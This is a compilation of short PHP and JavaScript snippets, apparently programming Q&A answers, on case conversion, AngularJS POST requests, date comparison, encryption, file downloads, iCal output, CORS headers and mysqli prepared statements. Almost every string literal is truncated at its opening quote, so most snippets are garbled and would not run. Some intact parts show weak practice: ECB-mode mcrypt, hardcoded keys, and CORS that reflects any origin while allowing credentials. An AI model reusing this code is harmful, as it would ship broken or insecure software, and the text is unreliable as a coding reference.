function camelToSnake($camel) { $snake = preg_replace_callback( return }, $camel); return ltrim($snake, }
/** * Convert a string to snake case. * * @param string $value * @param string $delimiter * @return string */ public static function snake($value, $delimiter = { if (!ctype_lower($value)) { $value = strtolower(preg_replace( } return $value; }
decamelize($str, $glue= { $counter = 0; $uc_chars = $new_str = array(); $str_len = strlen($str); for ($x=0; $x<$str_len; ++$x) { $ascii_val = ord($str[$x]); if ($ascii_val >= 65 && $ascii_val <= 90) { $uc_chars .= $str[$x]; } } $tok = strtok($str, $uc_chars); while ($tok !== false) { $new_char = chr(ord($uc_chars[$counter]) + 32); $new_str[] = $new_char . $tok; $tok = strtok($uc_chars); ++$counter; } return implode($new_str, $glue); }
function underscore($word){ $word = preg_replace( $word = preg_replace( return strtolower(strtr($word, }
mb_strtolower( preg_replace_callback( function ($a) { return "_$a[0]"; }, ) );
function decamelize($str, $glue= $capitals = array(); $replace = array(); foreach(str_split($str) as $index => $char) { if(ord($char) >= 65 && ord($char) <= 90) { $capitals[] = $char; $replace[] = ($index > 0 ? $glue : } } if(sizeof($capitals)) return str_replace($capitals, $replace, $str); return $str; }
function camel2snake($name) { $str_arr = str_split($name); foreach ($str_arr as $k => &$v) { if (ord($v) >= 64 && ord($v) <= 90) { $v = strtolower($v); $v = ($k != 0) ? } } return implode( }
/** * Converts any "CamelCased" into an "underscored_word". * @param string $words the word(s) to underscore * @return string */ public static function underscore($words) { return strtolower(preg_replace( }
<?php namespace MyNamespace\Utility; use Zend\Filter\Word\CamelCaseToUnderscore; use Zend\Filter\Word\UnderscoreToCamelCase; class String { public function test() { $underscoredStrings = array( ); $camelCasedStrings = array( ); echo PHP_EOL . foreach ($underscoredStrings as $rawString) { $filteredString = $this->underscoreToCamelCase($rawString); echo PHP_EOL . $rawString . } echo PHP_EOL . foreach ($camelCasedStrings as $rawString) { $filteredString = $this->camelCaseToUnderscore($rawString); echo PHP_EOL . $rawString . } } public function camelCaseToUnderscore($input) { $camelCaseToSeparatorFilter = new CamelCaseToUnderscore(); $result = $camelCaseToSeparatorFilter->filter($input); $result = strtolower($result); return $result; } public function underscoreToCamelCase($input) { $underscoreToCamelCaseFilter = new UnderscoreToCamelCase(); $result = $underscoreToCamelCaseFilter->filter($input); return $result; } }
function CamelCaseToSeparator($value,$separator = { if (!is_scalar($value) && !is_array($value)) { return $value; } if (defined( $pattern = [ $replacement = [$separator . } else { $pattern = [ $replacement = [ } return preg_replace($pattern, $replacement, $value); } function CamelCaseToUnderscore($value){ return CamelCaseToSeparator($value, } function CamelCaseToDash($value){ return CamelCaseToSeparator($value, } $string = CamelCaseToUnderscore("CamelCase");
use org\turbocommons\src\main\php\utils\StringUtils; echo StringUtils::formatCase(
$pascal = str_replace("_", "", $string); $snake = strtolower($string);
$capitalized = str_replace("_", " ", $string); $constant = strtoupper($string); $train = str_replace("_", "-", $snake);
<?php if($condition) : ?> <a href="http: <?php endif; ?>
<?php if($condition) : ?> <a href="http: <?php elseif($anotherCondition) : ?> more html <?php else : ?> even more html <?php endif; ?>
<?php if ( $my_name == "someguy" ) { ?> HTML GOES HERE <?php; } ?>
<?php if ($condition) { echo <<< END_OF_TEXT <b>lots of html</b> <i>$variable</i> lots of text... many lines possible, with any indentation, until the closing delimiter... END_OF_TEXT; } ?>
<?php $isARequest = true; if ($isARequest){include( else if (!$isARequest) {include( ?>
<?php $var1 = if ($var1 == $html = file_get_contents( $template_placeholders = array( $template_replace_variables = array($var1, $var2, $var3, $var4); $html_output = str_replace($template_placeholders, $template_replace_variables, $html); } echo $html_output; ?>
function LoginForm($scope, $http) { $http.defaults.headers.post[ $scope.email = "fsdg@sdf.com"; $scope.password = "1234"; $scope.login = function() { data = { }; $http.post( .success(function(data, status, headers, config) { console.log(status + }) .error(function(data, status, headers, config) { console.log( }); } }
<?php $email = $_POST[ $pass = $_POST[ echo $email; ?>
$postdata = file_get_contents("php: $request = json_decode($postdata); $email = $request->email; $pass = $request->password;
if ($_SERVER[ $_POST = json_decode(file_get_contents(
if(isset($_SERVER["CONTENT_TYPE"]) && strpos($_SERVER["CONTENT_TYPE"], "application/json") !== false) { $_POST = array_merge($_POST, (array) json_decode(trim(file_get_contents( }
myApp.config(function($httpProvider) { $httpProvider.defaults.headers.post[ });
angular.module( var formData = { password: var postData = $http({ method : url : data: postData, headers : { }).success(function(res){ console.log(res); }).error(function(error){ console.log(error); }); }]);
<?php $myData = json_decode($_POST[ print_r($myData); ?>
var serialize = function(obj, prefix) { var str = []; for(var p in obj) { if (obj.hasOwnProperty(p)) { var k = prefix ? prefix + "[" + p + "]" : p, v = obj[p]; str.push(typeof v == "object" ? serialize(v, k) : encodeURIComponent(k) + "=" + encodeURIComponent(v)); } } return str.join("&"); }; var app = angular.module( app.config(function ($httpProvider) { $httpProvider.defaults.transformRequest = function(data){ if (data === undefined) { return data; } return serialize(data); }; $httpProvider.defaults.headers.post[ });
... var data = { id: $http.post(my_php_url,data).success(function(data){ }).error(function() { });
var myApp = angular.module( var dataObj = { task_to_perform: }; myApp.controller( $http({ method: dataType: url: ajax_processor_url, headers: { }, data: dataObj, timeout: 30000, cache: false }). success(function (rsp) { console.log("success"); console.log(rsp); }). error(function (rsp) { console.log("error"); }); });
$pos = strrpos($url, $id = $pos === false ? $url : substr($url, $pos + 1);
$url = "http: if ( preg_match( "/\d+$/", $url, $matches ) ) { print $matches[0]; }
$str = "http: $s = explode("/",$str); print end($s);
$var = echo substr($a,(strrpos($var, echo current(array_reverse(explode(
/** * remove the last directories * * @param $path the path * @param $level number of directories to remove * * @return string */ private function removeLastDir($path, $level) { if(is_int($level) && $level > 0){ $path = preg_replace( return $this->removeLastDir($path, (int) $level - 1); } return $path; }
if (new DateTime() > new DateTime("2010-05-15 16:00:00")) { }
$dtA = new DateTime( $dtB = new DateTime( if ( $dtA > $dtB ) { echo } else { echo }
function getDatetimeNow() { $tz_object = new DateTimeZone( $datetime = new DateTime(); $datetime->setTimezone($tz_object); return $datetime->format( } $currentDate = getDatetimeNow(); $dtA = new DateTime($currentDate); $dtB = new DateTime($date); if ( $dtA > $dtB ) { $active = 0; return $active; } else { $active = 1; return $active; }
date_default_timezone_set( $curDateTime = date("Y-m-d H:i:s"); $myDate = date("Y-m-d H:i:s", strtotime("2018-06-26 16:15:33")); if($myDate < $curDateTime){ echo "active";exit; }else{ echo "inactive";exit; }
<?php echo "<pre>"; print_r(get_loaded_extensions()); echo "<pre/>"; ?>
function array_plus($a, $b){ $results = array(); foreach($a as $k=>$v) if(!isset($results[$k]))$results[$k] = $v; foreach($b as $k=>$v) if(!isset($results[$k]))$results[$k] = $v; return $results; } function is_index($a){ $keys = array_keys($a); foreach($keys as $key) { $i = intval($key); if("$key"!="$i") return false; } return true; } function array_merge($a, $b){ if(is_index($a)) $a = array_values($a); if(is_index($b)) $b = array_values($b); $results = array(); if(is_index($a) and is_index($b)){ foreach($a as $v) $results[] = $v; foreach($b as $v) $results[] = $v; } else{ foreach($a as $k=>$v) $results[$k] = $v; foreach($b as $k=>$v) $results[$k] = $v; } return $results; }
$key_size = 32; $encryption_key = openssl_random_pseudo_bytes($key_size, $strong);
$iv_size = 16; $iv = openssl_random_pseudo_bytes($iv_size, $strong);
function pkcs7_pad($data, $size) { $length = $size - strlen($data) % $size; return $data . str_repeat(chr($length), $length); } $name = $enc_name = openssl_encrypt( pkcs7_pad($name, 16), $encryption_key, 0, $iv );
function pkcs7_unpad($data) { return substr($data, 0, -ord($data[strlen($data) - 1])); } $row = $result->fetch(PDO::FETCH_ASSOC); $enc_name = $row[ $iv = $row[ $name = pkcs7_unpad(openssl_decrypt( $enc_name, $encryption_key, 0, $iv ));
$auth_key = openssl_random_pseudo_bytes(32, $strong); $auth = hash_hmac( $auth_enc_name = $auth . $enc_name; $auth = substr($auth_enc_name, 0, 32); $enc_name = substr($auth_enc_name, 32); $actual_auth = hash_hmac( if (hash_equals($auth, $actual_auth)) { }
$password = $random = openssl_random_pseudo_bytes(18); $salt = sprintf( 13, substr(strtr(base64_encode($random), ); $hash = crypt($password, $salt);
$given_password = $_POST[ $db_hash = $row[ $given_hash = crypt($given_password, $db_hash); if (isEqual($given_hash, $db_hash)) { } function isEqual($str1, $str2) { $n1 = strlen($str1); if (strlen($str2) != $n1) { return false; } for ($i = 0, $diff = 0; $i != $n1; ++$i) { $diff |= ord($str1[$i]) ^ ord($str2[$i]); } return !$diff; }
$hash = password_hash($password, PASSWORD_BCRYPT, [
if (password_verify($given_password, $db_hash)) { }
$key = $encrypted = mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, $decrypted = mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $key, $encrypted, MCRYPT_MODE_ECB);
$key = $ciphertext = mcrypt_encrypt(MCRYPT_BLOWFISH, $key, $plaintext = mcrypt_decrypt(MCRYPT_BLOWFISH, $key, $encrypted, MCRYPT_MODE_CFB);
$textToEncrypt = "My Text to Encrypt"; $encryptionMethod = "AES-256-CBC"; $secretHash = "encryptionhash"; $iv = mcrypt_create_iv(16, MCRYPT_RAND); $encryptedText = openssl_encrypt($textToEncrypt,$encryptionMethod,$secretHash, 0, $iv); $decryptedText = openssl_decrypt($encryptedText, $encryptionMethod, $secretHash, 0, $iv); print "My Decrypted Text: ". $decryptedText;
function my_simple_crypt( $string, $action = $secret_key = $secret_iv = $output = false; $encrypt_method = "AES-256-CBC"; $key = hash( $iv = substr( hash( if( $action == $output = base64_encode( openssl_encrypt( $string, $encrypt_method, $key, 0, $iv ) ); } else if( $action == $output = openssl_decrypt( base64_decode( $string ), $encrypt_method, $key, 0, $iv ); } return $output; }
$encryption_key = $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length( $encrypted = openssl_encrypt($plaintext, $encrypted = $encrypted . $parts = explode( $decrypted = openssl_decrypt($parts[0],
$bytes = openssl_random_pseudo_bytes(16); $hex = bin2hex($bytes);
$file_url = header( header("Content-Transfer-Encoding: Binary"); header("Content-disposition: attachment; filename=\"" . basename($file_url) . "\""); readfile($file_url);
header("Content-Type: application/octet-stream"); header("Content-Transfer-Encoding: Binary"); header("Content-disposition: attachment; filename=\"file.exe\""); echo readfile($url);
<?php $file = "http: header("Content-Description: File Transfer"); header("Content-Type: application/octet-stream"); header("Content-Disposition: attachment; filename=" . basename($file)); readfile ($file); exit(); ?>
<?php include( function output_file($file, $name, $mime_type= { if(!is_readable($file)) die( $size = filesize($file); $name = rawurldecode($name); $known_mime_types=array( "htm" => "text/html", "exe" => "application/octet-stream", "zip" => "application/zip", "doc" => "application/msword", "jpg" => "image/jpg", "php" => "text/plain", "xls" => "application/vnd.ms-excel", "ppt" => "application/vnd.ms-powerpoint", "gif" => "image/gif", "pdf" => "application/pdf", "txt" => "text/plain", "html"=> "text/html", "png" => "image/png", "jpeg"=> "image/jpg" ); if($mime_type== $file_extension = strtolower(substr(strrchr($file,"."),1)); if(array_key_exists($file_extension, $known_mime_types)){ $mime_type=$known_mime_types[$file_extension]; } else { $mime_type="application/force-download"; }; }; @ob_end_clean(); if(ini_get( ini_set( header( header( header("Content-Transfer-Encoding: binary"); header( if(isset($_SERVER[ { list($a, $range) = explode("=",$_SERVER[ list($range) = explode(",",$range,2); list($range, $range_end) = explode("-", $range); $range=intval($range); if(!$range_end) { $range_end=$size-1; } else { $range_end=intval($range_end); } $new_length = $range_end-$range+1; header("HTTP/1.1 206 Partial Content"); header("Content-Length: $new_length"); header("Content-Range: bytes $range-$range_end/$size"); } else { $new_length=$size; header("Content-Length: ".$size); } $chunksize = 1*(1024*1024); $bytes_send = 0; if ($file = fopen($file, { if(isset($_SERVER[ fseek($file, $range); while(!feof($file) && (!connection_aborted()) && ($bytes_send<$new_length) ) { $buffer = fread($file, $chunksize); echo($buffer); flush(); $bytes_send += strlen($buffer); } fclose($file); } else die( die(); } set_time_limit(0); $file_path= /*output must be folder/yourfile*/ output_file($file_path, header( ?>
$file = $maxRead = 1 * 1024 * 1024; $fileName = $fh = fopen($file, header( header( while (!feof($fh)) { echo fread($fh, $maxRead); ob_flush(); } exit;
$finfo = finfo_open(FILEINFO_MIME_TYPE); header( $finfo = finfo_open(FILEINFO_MIME_ENCODING); header( header( readfile($path);
header( header("Content-Disposition: attachment; filename=\"$file_name\""); set_time_limit(0); $file = @fopen($filePath, "rb"); while(!feof($file)) { print(@fread($file, 1024*8)); ob_flush(); flush(); }
use PHPUnit\Framework\TestCase; class SampleTest extends TestCase { }
namespace AcmeInc\MyApplication\Tests class StackTest extends \PHPUnit_Framework_TestCase {}
wget https: chmod +x phpunit.phar mv phpunit.phar /usr/local/bin/phpunit
<?php class StackTest extends PHPUnit_Framework_TestCase { protected function setUp() { } public function testSave() { } }
<testsuites> <testsuite name="DemoTestSuite"> <directory suffix="test.php">demo</directory> </testsuite> </testsuites>
Index: /branches/4.7/tests/phpunit/includes/bootstrap.php
$ cd [WORDPRESS DIRECTORY] $ patch -p5 < changeset_40547.diff
foreach($display_related_tags as $tag_name) { if($tag_name == $found_tag[ } }
foreach ($display_related_tags as $key => $tag_name) { if($tag_name == $found_tag[ unset($display_related_tags[$key]); } }
$display_related_tags = array_filter($display_related_tags, function($e) use($found_tag){ return $e != $found_tag[ });
foreach($display_related_tags as $key => $tag_name) { if($tag_name == $found_tag[ unset($display_related_tags[$key]; }
$result=array_search($unwantedValue,$array,true); if($result !== false) { unset($array[$result]); }
$result=array_keys($array,$unwantedValue,true) foreach($result as $key) { unset($array[$key]); }
foreach ($manSkuQty as $man_sku => &$man_qty) { foreach ($manufacturerSkus as $key1 => $val1) { if(some condition) unset($manSkuQty[$key1]); } } }
public static function removeKeysFromAssociativeArray($associativeArray, $keysToUnset) { if (empty($associativeArray) || empty($keysToUnset)) return array(); foreach ($associativeArray as $key => $arr) { if (!is_array($arr)) { continue; } foreach ($keysToUnset as $keyToUnset) { if (array_key_exists($keyToUnset, $arr)) { unset($arr[$keyToUnset]); } } $associativeArray[$key] = $arr; } return $associativeArray; }
removeKeysFromAssociativeArray($arrValues, $keysToRemove);
class test { public static function sayHi() { echo } }
class test { public function sayHi($hi = "Hi") { $this->hi = $hi; return $this->hi; } } class test1 { public static function sayHi($hi) { $hi = "Hi"; return $hi; } } $mytest = new test(); print $mytest->sayHi( print test1::sayHi(
$ical = "BEGIN:VCALENDAR VERSION:2.0 PRODID:- BEGIN:VEVENT UID:" . md5(uniqid(mt_rand(), true)) . "@yourhost.test DTSTAMP:" . gmdate( DTSTART:19970714T170000Z DTEND:19970715T035959Z SUMMARY:Bastille Day Party END:VEVENT END:VCALENDAR"; header( header( echo $ical; exit;
function dateToCal($timestamp) { return date( } function escapeString($string) { return preg_replace( } $eol = "\r\n"; $load = "BEGIN:VCALENDAR" . $eol . "VERSION:2.0" . $eol . "PRODID:- "CALSCALE:GREGORIAN" . $eol . "BEGIN:VEVENT" . $eol . "DTEND:" . dateToCal($end) . $eol . "UID:" . $id . $eol . "DTSTAMP:" . dateToCal(time()) . $eol . "DESCRIPTION:" . htmlspecialchars($title) . $eol . "URL;VALUE=URI:" . htmlspecialchars($url) . $eol . "SUMMARY:" . htmlspecialchars($description) . $eol . "DTSTART:" . dateToCal($start) . $eol . "END:VEVENT" . $eol . "END:VCALENDAR"; $filename="Event-".$id; header( header( echo $load;
$vCalendar = new \Eluceo\iCal\Component\Calendar( $vEvent = new \Eluceo\iCal\Component\Event(); $vEvent->setDtStart(new \DateTime( $vEvent->setDtEnd(new \DateTime( $vEvent->setNoTime(true); $vEvent->setSummary( $vEvent->setUseTimezone(true); $vCalendar->addComponent($vEvent); header( header( echo $vCalendar->render();
BEGIN:VCALENDAR VERSION:2.0 PRODID:- BEGIN:VEVENT DTSTART:19970714T170000Z DTEND:19970715T035959Z SUMMARY:Bastille Day Party END:VEVENT END:VCALENDAR
$content = "BEGIN:VCALENDAR\n". "VERSION:2.0\n". "PRODID:- "BEGIN:VEVENT\n". "UID:".uniqid()."\n". "DTSTAMP:".$time."\n". "DTSTART:".$time."\n". "DTEND:".$time."\n". "SUMMARY:".$summary."\n". "END:VEVENT\n". "END:VCALENDAR";
$token = uniqid(mt_rand(), TRUE); $_SESSION[ $url = "http:
if (!empty($_SERVER[ header("Location: " . $_SERVER[ } else { header("Location: index.php"); } exit;
$ php -v dyld: Library not loaded: /usr/local/lib/libjpeg.8.dylib Referenced from: /usr/local/bin/php Reason: image not found Trace/BPT trap: 5
wget -c http: tar xzf jpegsrc.v8d.tar.gz cd jpeg-8d ./configure make cp ./.libs/libjpeg.8.dylib /usr/local/opt/jpeg/lib
$brew info libjpeg jpeg: stable 9b (bottled) Image manipulation library http: /usr/local/Cellar/jpeg/9b (20 files, 724KB) * Poured from bottle on 2017-08-07 at 12:06:42 From: https:
brew uninstall php54 brew install --build-from-source php54
ln -s /usr/local/lib/libjpeg.9.dylib /usr/local/lib/libjpeg.8.dylib
<?php header("Access-Control-Allow-Origin: *"); header("Access-Control-Allow-Headers: *"); ...
/** * An example CORS-compliant method. It will allow any GET, POST, or OPTIONS requests from any * origin. * * In a production environment, you probably want to be more restrictive, but this gives you * the general idea of what is involved. For the nitty-gritty low-down, read: * * - https: * - http: * */ function cors() { if (isset($_SERVER[ header("Access-Control-Allow-Origin: {$_SERVER[ header( header( } if ($_SERVER[ if (isset($_SERVER[ header("Access-Control-Allow-Methods: GET, POST, OPTIONS"); if (isset($_SERVER[ header("Access-Control-Allow-Headers: {$_SERVER[ exit(0); } echo "You have CORS!"; }
header( header( header("Access-Control-Allow-Headers: X-Requested-With");
<?php if ($_SERVER[ header( header( header( header( header( header( die(); } header( header( $ret = [ ]; print json_encode($ret);
header( header("Access-Control-Allow-Credentials: true"); header( header( header(
if(isset($_SERVER["HTTP_ORIGIN"])) { header("Access-Control-Allow-Origin: {$_SERVER[ } else { header("Access-Control-Allow-Origin: *"); } header("Access-Control-Allow-Credentials: true"); header("Access-Control-Max-Age: 600"); if($_SERVER["REQUEST_METHOD"] == "OPTIONS") { if (isset($_SERVER["HTTP_ACCESS_CONTROL_REQUEST_METHOD"])) header("Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE, PUT"); if (isset($_SERVER["HTTP_ACCESS_CONTROL_REQUEST_HEADERS"])) header("Access-Control-Allow-Headers: {$_SERVER[ exit(0); }
header("Access-Control-Allow-Origin: *"); header("Access-Control-Allow-Credentials: true"); header("Access-Control-Max-Age: 1000"); header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Cache-Control, Pragma, Authorization, Accept, Accept-Encoding"); header("Access-Control-Allow-Methods: PUT, POST, GET, OPTIONS, DELETE");
header("Access-Control-Allow-Origin: *"); header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Cache-Control, Pragma, Authorization, Accept, Accept-Encoding");
if (substr($string, -1, 1) == { $string = substr($string, 0, -1); }
foreach($a as $b) $result[] = $b; $result = implode(
$coma = ""; foreach($a as $b){ $string .= $coma.$b; $coma = ","; }
if(substr($str, -1, 1) == $str = substr($str, 0, -1); }
include $conn = new Connection(); $query = $stmt = $conn->mysqli->prepare($query); $stmt->bind_param( $stmt->execute(); $result = $stmt->get_result();
define( define( define( define( class Connection{ /** * @var Resource */ var $mysqli = null; function __construct(){ try{ if(!$this->mysqli){ $this->mysqli = new MySQLi(SERVER, USER, PASS, DB); if(!$this->mysqli) throw new Exception( } } catch(Exception $ex){ echo "ERROR: ".$e->getMessage(); } } }
include $conn = new Connection(); $query = $stmt = $conn->mysqli->prepare($query); $stmt->bind_param( $stmt->execute(); $stmt->bind_result($EmailVerified, $Blocked); while ($stmt->fetch()) { } $stmt->close(); $conn->mysqli->close();
function fetchAssocStatement($stmt) { if($stmt->num_rows>0) { $result = array(); $md = $stmt->result_metadata(); $params = array(); while($field = $md->fetch_field()) { $params[] = &$result[$field->name]; } call_user_func_array(array($stmt, if($stmt->fetch()) return $result; } return null; }
if($stmt = $mysqli_connection->prepare($query)) { $stmt->execute(); $stmt->store_result(); while($assoc_array = fetchAssocStatement($stmt)) { } $stmt->close(); }
$stmt->bind_results($var1,$var2,$var3,$var4...etc);
$c=1000; $sql="select account_id, username from accounts where account_id<?"; $stmt = $mysqli->prepare($sql); $stmt->bind_param( $stmt->execute(); $result = $stmt->get_result(); while($data = $result->fetch_array(MYSQLI_NUM)) { print $data[0] . }
$c=1000; $sql="select account_id, username from accounts where account_id<?"; $stmt = $mysqli->prepare($sql); $stmt->bind_param( $stmt->execute(); $stmt->bind_result($data[0], $data[1]); while ($stmt->fetch()) { print $data[0] . }
$c=1000; $sql="select account_id, username from accounts where account_id<?"; $stmt = $mysqli->prepare($sql); $stmt->bind_param( $stmt->execute(); $data=array(); for ($i=0;$i<$mysqli->field_count;$i++) { $var = $i; $$var = null; $data[$var] = &$$var; } call_user_func_array(array($stmt, while ($stmt->fetch()) { print $data[0] . }
class MMySqliStmt{ private $stmt; private $row; public function __construct($stmt){ $this->stmt = $stmt; $md = $stmt->result_metadata(); $params = array(); while($field = $md->fetch_field()) { $params[] = &$this->row[$field->name]; } call_user_func_array(array($stmt, } public function fetch_array(){ if($this->stmt->fetch()){ $result = array(); foreach($this->row as $k => $v){ $result[$k] = $v; } return $result; }else{ return false; } } public function free(){ $this->stmt->close(); } }
$stmt = $conn->prepare($str); if(!$stmt->execute())die( $result = new MMySqliStmt($stmt); while($row = $result->fetch_array()){ array_push($arr, $row); } $result->free();
function bindAll($stmt) { $meta = $stmt->result_metadata(); $fields = array(); $fieldRefs = array(); while ($field = $meta->fetch_field()) { $fields[$field->name] = ""; $fieldRefs[] = &$fields[$field->name]; } call_user_func_array(array($stmt, $stmt->store_result(); return $fields; } function fetchRowAssoc($stmt, &$fields) { if ($stmt->fetch()) { return $fields; } return false; }
$array = array( array_combine(array_unshift(array_keys($array),
function unshift( array & $array, $key, $val) { $array = array_reverse($array, 1); $array[$key] = $val; $array = array_reverse($array, 1); return $array; }
$array1 = array( $array2 = array( $resulting_array = (
$resulting_array = $array1 + $array2; ksort($resulting_array);
$before = microtime(true); for ($i=0 ; $i<100000 ; $i++) { serialize($list); } $after = microtime(true); echo ($after-$before)/$i . " sec/serialize\n";
xdebug.profiler_enable = 0 ; Profiling not activated by default xdebug.profiler_enable_trigger = 1 ; Profiling activated when requested by the GET parameter xdebug.profiler_output_dir = /tmp/ouput_directory xdebug.profiler_output_name = files_names
$startTime = microtime(true); doTask(); echo "Time: " . number_format(( microtime(true) - $startTime), 4) . " Seconds\n";
class TimingHelper { private $start; public function __construct() { $this->start = microtime(true); } public function start() { $this->start = microtime(true); } public function segs() { return microtime(true) - $this->start; } public function time() { $segs = $this->segs(); $days = floor($segs / 86400); $segs -= $days * 86400; $hours = floor($segs / 3600); $segs -= $hours * 3600; $mins = floor($segs / 60); $segs -= $mins * 60; $microsegs = ($segs - floor($segs)) * 1000; $segs = floor($segs); return (empty($days) ? "" : $days . "d ") . (empty($hours) ? "" : $hours . "h ") . (empty($mins) ? "" : $mins . "m ") . $segs . "s " . $microsegs . "ms"; } }
$th = new TimingHelper(); <..code being mesured..> echo $th->time(); $th->start(); <..code being mesured..> echo $th->time();
function fdump($f_name= $f_dump=array(); $f_result= $f_success=false; $f_start=microtime(); $f_start=explode( $f_start=$f_start[1] + $f_start[0]; if(function_exists($f_name)){ if(isset($f_args[0])&&is_array($f_args[0])){ if($f_result=$f_name($f_args)){ $f_success=true; } } elseif(!isset($f_args[1])){ if($f_result=$f_name($f_args[0])){ $f_success=true; } } elseif(!isset($f_args[2])){ if($f_result=$f_name($f_args[0],$f_args[1])){ $f_success=true; } } elseif(!isset($f_args[3])){ if($f_result=$f_name($f_args[0],$f_args[1],$f_args[2])){ $f_success=true; } } elseif(!isset($f_args[4])){ if($f_result=$f_name($f_args[0],$f_args[1],$f_args[2],$f_args[3])){ $f_success=true; } } elseif(!isset($f_args[5])){ if($f_result=$f_name($f_args[0],$f_args[1],$f_args[2],$f_args[3],$f_args[4])){ $f_success=true; } } elseif(!isset($f_args[6])){ if($f_result=$f_name($f_args[0],$f_args[1],$f_args[2],$f_args[3],$f_args[4],$f_args[5])){ $f_success=true; } } elseif(!isset($f_args[7])){ if($f_result=$f_name($f_args[0],$f_args[1],$f_args[2],$f_args[3],$f_args[4],$f_args[5],$f_args[6])){ $f_success=true; } } elseif(!isset($f_args[8])){ if($f_result=$f_name($f_args[0],$f_args[1],$f_args[2],$f_args[3],$f_args[4],$f_args[5],$f_args[6],$f_args[7])){ $f_success=true; } } elseif(!isset($f_args[9])){ if($f_result=$f_name($f_args[0],$f_args[1],$f_args[2],$f_args[3],$f_args[4],$f_args[5],$f_args[6],$f_args[7],$f_args[8])){ $f_success=true; } } elseif(!isset($f_args[10])){ if($f_result=$f_name($f_args[0],$f_args[1],$f_args[2],$f_args[3],$f_args[4],$f_args[5],$f_args[6],$f_args[7],$f_args[8],$f_args[9])){ $f_success=true; } } } $f_end=microtime(); $f_end=explode( $f_end=$f_end[1] + $f_end[0]; $f_time=round(($f_end - $f_start), 4); $f_dump[ $f_dump[ $f_dump[ var_dump($f_dump);exit; }
array(3) { ["f_success"]=> bool(true) ["f_time"]=> float(0) ["f_result"]=> string(11) "hello world" }
$milliseconds = round(microtime(true) * 1000); echo round(microtime(true) * 1000) - $milliseconds;
